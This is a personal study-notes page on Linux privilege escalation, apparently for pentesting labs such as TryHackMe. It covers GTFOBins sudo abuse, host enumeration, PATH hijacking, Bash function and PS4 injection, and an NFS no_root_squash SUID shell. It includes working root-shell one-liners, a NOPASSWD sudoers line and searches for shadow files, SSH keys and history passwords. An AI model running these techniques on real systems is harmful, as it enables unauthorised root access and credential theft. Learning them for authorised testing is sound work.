# Compromise a Linux host

<hr class="sep-both">

## 🎁 GTFOBins 🎁

<div class="row row-cols-md-2"><div>

It's common for well-known Linux commands to be misconfigured. Vulnerabilities can lead to reading/writing root-only files, executing commands as root...

**[gtfobins](https://gtfobins.github.io/)** (7.4k ⭐) is the reference when looking for commands to exploit misconfigured Linux commands.

> There is a local version of [gtfo in Python](https://github.com/t0thkr1s/gtfo) (96 ⭐, 2021).
</div><div>

Example: you can only run `tar` using `sudo`. Run the command below from [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo), and you will get a root shell.

```bash
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

> I'm adding [some extras here](gtfobins.md). Two small notes
> 
> * `/bin/bash -i`: start an interactive bash
> * `/bin/bash -p`: do not drop privilege <small>(SUID, start the bash as root)</small>
</div></div>

<hr class="sep-both">

## Learn more about your environment

Aside from commands that are in the Linux notes, here are a few used in cybersecurity.

<div class="row row-cols-md-2"><div>

* `w`: who is logged in, and what they are doing
* `who`: who is logged in
* `echo $0`: language used by the current shell
* `whoami`: username
* `last`: list of last logged users
* `id`: username, group...
* `groups`: list groups
* `uname -a`: info about the kernel
* `hostname`: info about the host <small>(ex: `website-dev` -> role of the user)</small>
* `ps -e` / `top`: see running process
* `env`: see environment variables
* `umask`: see the default perms on newly created files
* `finger`: return a summary of information about a user
* `find / -writable -type d 2>/dev/null`: find writable directories

**Potentially vulnerable services** 💸

* Apache: `apache2 -v` / `apache2ctl -M`
* Sudo: `sudo -V`
* PostgresSQL: `psql -V`
* MySQL: `mysql --version`
</div><div>

System Files 🔏

* `/proc/version`: information about the machine
* `/etc/*release`: information about the operating system
* `/etc/issue`: an alternative to find the OS/version
* `/etc/passwd`: usernames, their groups, their home, and their shell
* `/etc/shadow` <small>(root)</small>: username, and their hashed password
* `/etc/sudoers` <small>(root)</small>: sudoers, and rules applied to them, if any

User files 🍃

* `ls -ahl /root/`: see if there are readable files in root's home
* `ls /`: look for unexpected folders in `/`
* `find / -name *id_dsa* 2> /dev/null`: RSA credentials
* `~/.bash_history`: password (sudo/mysql...)
* Look for backups <small>(.bak, .old...)</small>

Others 🔎

* Look for mails `/var/mail/`
* Look for logs `/var/log/`
  * Look for firewall logs (`/var/log/syslog`)
  * Look for apache/... logs
  * Look for fail2ban logs
  * Look for ssh logs (`/var/log/auth.log`)
* `/etc/services`: see ports and the services running on it
* `/etc/profile`: set environment variables...

</div></div>

> **NOTE**: don't forget to redirect any errors with `some_command 2> /dev/null`.

<hr class="sep-both">

## Environment

<div class="row row-cols-md-2"><div>

In a lot of cases (SUID/GUID, sudo, capabilities...), you may have to use the trick of editing the environment. In all the cases listed, a **regular user** is allowed to run an executable/command/script **as root**.

There are basic scenarios in which you can directly exploit the executable, but in other scenarios, you may have to exploit the environment, meaning

* edit the environment variables
* edit the files used by the program
* create a file named after the options of the command, so that when a vulnerable glob-pattern is replaced, you will actually inject options
* ...

For instance, if a script uses the command `ls` and the environment variable `PATH` with the value `/tmp:[...]`, then because you can write in `/tmp`, you can create an executable named `ls` which is actually a `bash`. When the script run as root is executed, the command bash is executed as root, and your escalation is done. If you are the one running the script, you can also change your own PATH.
</div><div>

**Bash versions <4.2-048**: it is possible to create functions named after a path, which allows us to execute a command instead. If the path is accessed by a script, then using `-p`, we can create a bash while inheriting the permissions of its creator.

```bash
function /some/path { /bin/bash -p; }
export -f /some/path
```

**Bash <4.4**: if debug is enabled, we can inject code in the environment variable PS4 used by bash. If the script has the SUID bit, then using this, we could create a bash with the SUID bit too.

```bash
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/; chmod +xs /tmp/bash)' ./script
```
</div></div>

<hr class="sep-both">

## Network File System (NFS)

[![kenobi](../../_badges/thm-p/kenobi.svg)](https://tryhackme.com/room/kenobi)

<div class="row row-cols-md-2"><div>

To avoid copying and pasting information too much, you will have to read these pages for more information.

* [NFS protocol](/_it/networking/protocols/index.md#-nfs---2049-tcp)
* [NFS notes](/_cybersecurity/exploitation/services/index.md#nfs---2049-tcp)

To summarize, locally, you can use this command to find NFS shares.

```bash
# see NFS exports
$ cat /etc/exports
```
</div><div>

You will find an exploitable NFS misconfiguration when the option `no_root_squash` is set for a share. Root squashing map any local user to the user "nobody". If disabled, then the root user on the local machine will have root privilege inside the share.

```bash
# on the remote host, we create a bash inside the share
$ cp /bin/bash /share/sbash
# on the local host
# we give the file root privileges
$ sudo chown root /tmp/share/sbash
$ sudo chmod +s /tmp/share/sbash
# Then on the host, running the SUID file
# will run it as root
$ /share/sbash -p
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-md-2"><div>

Courses

* [payatu.com](https://payatu.com/guide-linux-privilege-escalation)
* [udemy.com](https://www.udemy.com/course/linux-privilege-escalation/)
* `$(whoami)  ALL=(ALL) NOPASSWD:ALL`
</div><div>
</div></div>